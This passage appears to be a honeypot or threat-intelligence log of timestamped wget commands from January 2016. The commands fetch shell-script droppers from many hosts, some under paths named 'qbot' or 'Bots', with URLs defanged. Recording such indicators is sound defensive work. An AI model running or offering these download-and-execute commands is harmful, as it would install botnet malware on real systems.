sh\u003Cbr \/\u003E2016-02-01 01:10:42 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-01 01:05:45 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-02-01 01:00:10 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-01 00:01:05 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-02-01 00:00:16 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-01-31 20:06:58 | wget hxxp:\/\/ 192.243.109.5\/DOGDICKS\/gtop . sh\u003Cbr \/\u003E2016-01-31 19:38:03 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-01-31 17:02:29 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-01-31 12:19:56 | wget hxxp:\/\/ 192.243.109.5\/DOGDICKS\/gtop . sh\u003Cbr \/\u003E2016-01-31 10:30:13 | wget hxxp:\/\/ 192.243.109.5\/DOGDICKS\/gtop . sh\u003Cbr \/\u003E2016-01-31 06:55:10 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-01-31 01:42:39 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-01-31 01:29:38 | wget -q hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-31 01:27:33 | wget -q hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-31 01:17:19 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-01-31 00:53:32 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-01-31 00:49:01 | wget -q hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-30 21:52:47 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-30 21:52:47 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-30 20:33:49 | wget hxxp:\/\/ 173.214.160.90\/gtop . sh\u003Cbr \/\u003E2016-01-30 20:00:15 | wget hxxp:\/\/ 173.214.160.90\/gtop . sh\u003Cbr \/\u003E2016-01-30 16:11:18 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-01-30 15:01:18 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-01-30 03:59:18 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-30 03:41:57 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-01-30 03:13:12 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-01-30 02:50:41 | wget hxxp:\/\/ 173.214.160.90\/gtop . sh\u003Cbr \/\u003E2016-01-30 02:16:54 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-01-30 01:48:32 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-01-30 01:27:04 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-01-30 01:03:57 | wget hxxp:\/\/ 173.214.160.90\/gtop . sh\u003Cbr \/\u003E2016-01-30 00:38:02 | wget hxxp:\/\/ 173.214.160.90\/gtop . sh\u003Cbr \/\u003E2016-01-29 23:25:54 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-29 23:25:51 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-29 22:21:59 | wget hxxp:\/\/ 173.214.160.90\/gtop . sh\u003Cbr \/\u003E2016-01-29 21:58:26 | wget hxxp:\/\/ 173.214.160.90\/gtop . sh\u003Cbr \/\u003E2016-01-29 15:48:44 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-01-29 15:38:32 | wget hxxp:\/\/ 173.214.160.90\/gtop . sh\u003Cbr \/\u003E2016-01-29 12:38:33 | wget hxxp:\/\/ 173.214.160.90\/gtop . sh-O \/tmp\/gtop . sh\u003Cbr \/\u003E2016-01-29 12:12:42 | wget hxxp:\/\/ 173.214.160.90\/gtop . sh-O \/tmp\/gtop . sh\u003Cbr \/\u003E2016-01-29 06:51:54 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-29 06:51:51 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-29 06:04:44 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-29 05:43:58 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-29 05:43:56 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-29 02:37:01 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-01-29 02:04:59 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-01-29 01:46:33 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-29 01:27:27 | wget ftx:\/\/23.89.158.69\/gtop . sh-O \/tmp\/gtop . sh\u003Cbr \/\u003E2016-01-29 01:04:07 | wget ftx:\/\/23.89.158.69\/gtop . sh-O \/tmp\/gtop . sh\u003Cbr \/\u003E2016-01-28 20:17:10 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-28 14:22:53 | wget hxxp:\/\/ 198.23.238.251\/gb . sh\u003Cbr \/\u003E2016-01-28 11:44:52 | wget ftx:\/\/23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-28 11:30:23 | wget ftx:\/\/23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-28 07:35:08 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-28 07:35:08 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-28 04:11:21 | wget -q hxxp:\/\/ 162.213.195.144\/Bots\/f . sh\u003Cbr \/\u003E2016-01-27 20:34:49 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-27 20:34:47 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-27 16:07:37 | wget ftx:\/\/23.89.158.69\/gtop . sh-O \/tmp\/gtop . sh\u003Cbr \/\u003E2016-01-27 12:40:52 | wget ftx:\/\/23.89.158.69\/gtop . sh-O \/tmp\/gtop . sh\u003Cbr \/\u003E2016-01-27 11:36:57 | wget ftx:\/\/23.89.158.69\/gtop . sh-O \/tmp\/gtop . sh\u003Cbr \/\u003E2016-01-27 11:26:49 | wget ftx:\/\/23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-27 10:50:10 | wget ftx:\/\/23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-27 10:07:17 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-26 08:01:29 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-26 08:01:26 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-25 21:33:13 | wget hxxp:\/\/ www.hongcherng.com\/sc\/sc . sh-O \/tmp\/sc . sh\u003Cbr \/\u003E2016-01-25 21:05:57 | wget hxxp:\/\/ www.hongcherng.com\/sc\/sc . sh-O \/tmp\/sc . sh\u003Cbr \/\u003E2016-01-25 18:30:30 | wget hxxp:\/\/ 163.47.11.201\/gtop . sh\u003Cbr \/\u003E2016-01-25 18:03:35 | wget hxxp:\/\/ 163.47.11.201\/gtop . sh\u003Cbr \/\u003E2016-01-25 17:23:50 | wget hxxp:\/\/ 163.47.11.201\/gtop . sh\u003Cbr \/\u003E2016-01-25 17:10:36 | wget -q hxxp:\/\/ 185.130.5.205\/bin . sh; \u003Cbr \/\u003E                              fetch hxxp:\/\/ 185.130.5.205\/bin . sh; \u003Cbr \/\u003E                              lwp-download hxxp:\/\/ 185.130.5.205\/bin . sh; \u003Cbr \/\u003E                              curl -O hxxp:\/\/ 185.130.5.205\/bin . sh\u003Cbr \/\u003E2016-01-25 17:07:52 | wget hxxp:\/\/ 163.47.11.201\/gtop . sh\u003Cbr \/\u003E2016-01-25 17:00:40 | wget hxxp:\/\/ 163.47.11.201\/gtop . sh\u003Cbr \/\u003E2016-01-25 15:19:33 | wget hxxp:\/\/ 163.47.11.201\/gtop . sh\u003Cbr \/\u003E2016-01-25 15:06:55 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-25 14:48:06 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-25 04:16:09 | wget hxxp:\/\/ 46.101.71.240\/gtop . sh\u003Cbr \/\u003E2016-01-25 04:04:00 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-25 03:46:01 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-25 03:24:12 | wget hxxp:\/\/ 178.19.111.244\/bin . sh\u003Cbr \/\u003E2016-01-25 02:54:05 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-25 02:53:59 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-25 02:25:41 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-25 02:19:41 | wget hxxp:\/\/ 208.67.1.2\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-25 01:34:10 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-25 01:33:39 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-25 01:13:21 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-25 00:50:59 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-25 00:21:05 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-24 23:37:31 | wget hxxp:\/\/ www.hongcherng.com\/sc\/sc . sh-O \/tmp\/sc . sh\u003Cbr \/\u003E2016-01-24 22:46:40 | wget hxxp:\/\/ www.hongcherng.com\/sc\/sc . sh-O \/tmp\/sc . sh\u003Cbr \/\u003E2016-01-24 22:44:21 | wget hxxp:\/\/ 178.19.111.244\/bin . sh\u003Cbr \/\u003E2016-01-24 22:29:34 | wget hxxp:\/\/ www.hongcherng.com\/sc\/sc . sh-O \/tmp\/sc . sh\u003Cbr \/\u003E2016-01-24 22:25:10 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-24 21:49:52 | wget hxxp:\/\/ www.hongcherng.com\/sc\/sc . sh-O \/tmp\/sc . sh\u003Cbr \/\u003E2016-01-24 12:56:39 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-24 11:32:43 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-24 08:20:29 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-24 08:20:26 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-24 07:22:52 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-24 06:37:33 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-24 04:40:34 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-24 04:10:18 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-24 02:17:06 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-24 01:37:50 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-24 01:18:03 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-24 00:58:46 | wget hxxp:\/\/ www.hongcherng.com\/sc\/sc . sh-O \/tmp\/sc . sh\u003Cbr \/\u003E2016-01-23 23:40:45 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-23 21:15:50 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-23 20:42:40 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-23 16:36:16 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-23 14:55:17 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-23 04:28:24 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-23 04:09:07 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-23 02:47:09 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-22 20:51:48 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-22 19:48:54 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-22 19:47:24 | wget hxxp:\/\/ 178.19.111.244\/y . sh\u003Cbr \/\u003E2016-01-22 19:27:17 | wget hxxp:\/\/ 178.19.111.244\/y . sh\u003Cbr \/\u003E2016-01-22 19:27:15 | wget hxxp:\/\/ 178.19.111.244\/y . sh\u003Cbr \/\u003E2016-01-22 17:50:05 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-22 16:44:18 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-22 15:56:34 | wget hxxp:\/\/ 206.72.207.194\/gtop . sh\u003Cbr \/\u003E2016-01-22 05:51:56 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-22 03:24:22 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-21 22:10:20 | wget hxxp:\/\/ www.hongcherng.com\/sc\/sc . sh-O \/tmp\/sc . sh\u003Cbr \/\u003E2016-01-21 17:49:26 | wget hxxp:\/\/ iplogger.xyz\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-21 16:21:59 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-21 13:52:03 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-21 13:52:01 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-21 07:26:36 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-21 07:02:10 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-21 03:22:21 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-21 02:10:30 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-20 23:57:05 | wget hxxp:\/\/ www.hongcherng.com\/sc\/sc . sh-O \/tmp\/sc . sh\u003Cbr \/\u003E2016-01-20 22:32:51 | wget hxxp:\/\/ binarys.x10.mx\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-20 21:56:08 | wget hxxp:\/\/ binarys.x10.mx\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-20 21:49:01 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-20 21:38:36 | wget hxxp:\/\/ 208.73.207.236\/gtop . sh\u003Cbr \/\u003E2016-01-20 21:07:50 | wget hxxp:\/\/ 208.73.207.236\/gtop . sh\u003Cbr \/\u003E2016-01-20 20:33:28 | wget hxxp:\/\/ 208.73.207.236\/gtop . sh\u003Cbr \/\u003E2016-01-20 17:10:47 | wget hxxp:\/\/ 208.73.207.236\/gtop . sh\u003Cbr \/\u003E2016-01-20 16:13:02 | wget hxxp:\/\/ 208.73.207.236\/gtop . sh\u003Cbr \/\u003E2016-01-20 10:49:05 | wget hxxp:\/\/ 198.23.238.251\/gb . sh\u003Cbr \/\u003E2016-01-20 09:41:22 | wget hxxp:\/\/ 208.73.207.236\/gtop . sh\u003Cbr \/\u003E2016-01-20 09:34:12 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-20 07:07:37 | wget hxxp:\/\/ 208.73.207.236\/gtop . sh\u003Cbr \/\u003E2016-01-20 06:51:52 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-20 06:41:03 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-20 06:01:47 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-20 05:46:11 | wget hxxp:\/\/ 208.73.207.236\/gtop . sh\u003Cbr \/\u003E2016-01-20 05:14:29 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-20 05:13:02 | wget hxxp:\/\/ 208.73.207.236\/gtop . sh\u003Cbr \/\u003E2016-01-20 05:02:00 | wget hxxp:\/\/ 208.73.207.236\/gtop . sh\u003Cbr \/\u003E2016-01-20 04:11:57 | wget hxxp:\/\/ 208.73.207.236\/gtop . sh\u003Cbr \/\u003E2016-01-20 03:57:14 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-20 03:13:32 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-20 03:05:47 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-20 02:27:34 | wget hxxp:\/\/ binarys.x10.mx\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-20 02:19:07 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-20 01:42:34 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-20 01:27:42 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-20 01:14:51 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-20 00:35:57 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-20 00:24:04 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-19 23:58:11 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-19 23:19:08 | wget 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-19 22:04:11 | wget hxxp:\/\/ 185.62.190.62\/dox . sh\u003Cbr \/\u003E2016-01-19 22:01:31 | wget hxxp:\/\/ 208.73.207.236\/gtop . sh\u003Cbr \/\u003E2016-01-19 21:44:34 | wget hxxp:\/\/ 185.62.190.62\/dox . sh\u003Cbr \/\u003E2016-01-19 21:21:10 | wget hxxp:\/\/ 185.62.190.62\/dox . sh\u003Cbr \/\u003E2016-01-19 21:04:47 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-19 20:13:14 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-19 16:09:39 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-19 15:21:47 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-19 15:12:13 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-19 15:12:13 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-19 14:56:57 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-19 14:11:33 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-19 08:30:58 | wget hxxp:\/\/ 185.62.190.62\/dox . sh\u003Cbr \/\u003E2016-01-19 07:58:19 | wget hxxp:\/\/ 185.62.190.62\/dox . sh\u003Cbr \/\u003E2016-01-19 04:32:58 | wget hxxp:\/\/ 185.62.190.62\/dox . sh\u003Cbr \/\u003E2016-01-19 03:52:38 | wget hxxp:\/\/ 185.62.190.62\/dox . sh\u003Cbr \/\u003E2016-01-19 03:37:52 | wget hxxp:\/\/ 185.62.190.62\/dox . sh\u003Cbr \/\u003E2016-01-19 03:09:10 | wget hxxp:\/\/ 158.69.217.211\/gb . sh\u003Cbr \/\u003E2016-01-19 02:03:04 | wget hxxp:\/\/ 158.69.217.211\/gb . sh\u003Cbr \/\u003E2016-01-18 22:37:44 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-18 22:31:33 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-18 21:48:44 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-18 19:16:51 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-18 19:09:59 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-18 18:33:30 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-18 18:26:36 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-18 18:25:36 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-18 18:08:11 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-18 17:47:42 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-18 17:35:26 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-18 16:14:46 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-18 15:50:46 | wget hxxp:\/\/ www.hongcherng.com\/rd\/rd . sh-O \/tmp\/ich . sh\u003Cbr \/\u003E2016-01-18 15:08:59 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-18 14:59:57 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-18 14:24:22 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-18 05:23:27 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-18 04:21:59 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-18 03:31:26 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-18 02:47:49 | wget hxxp:\/\/ binarys.x10.mx\/king\/Binarys . sh\u003Cbr \/\u003E2016-01-18 02:31:48 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-18 02:23:52 | wget hxxp:\/\/ binarys.x10.mx\/king\/Binarys . sh\u003Cbr \/\u003E2016-01-18 02:21:28 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr \/\u003E2016-01-18 02:15:19 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-18 01:32:08 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr \/\u003E2016-01-18 01:31:53 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-18 01:07:15 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-17 23:48:52 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-17 22:39:13 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-17 22:30:53 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-17 21:35:21 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-17 21:21:12 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-17 21:08:24 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-17 20:18:45 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-17 19:45:02 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-17 18:54:33 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-17 18:13:59 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-17 17:57:51 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-17 17:03:06 | wget hxxp:\/\/ 94.102.49.197\/gb-wget . sh\u003Cbr \/\u003E2016-01-17 09:51:02 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-17 09:15:53 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-17 08:37:10 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-17 06:42:49 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-17 05:59:09 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-17 01:47:52 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr \/\u003E2016-01-17 00:39:05 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr \/\u003E2016-01-16 23:41:42 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-16 23:13:19 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-16 23:09:42 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-16 22:54:36 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-16 22:49:27 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-16 22:23:13 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-16 22:15:45 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-16 20:16:46 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-16 20:09:38 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-16 18:43:42 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-16 18:33:39 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-16 18:07:11 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-16 17:46:52 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-16 17:37:08 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-16 08:12:22 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-16 02:50:01 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-15 23:06:34 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-15 22:37:03 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-15 22:32:13 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-15 22:20:20 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-15 21:02:27 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr \/\u003E2016-01-15 19:44:51 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr 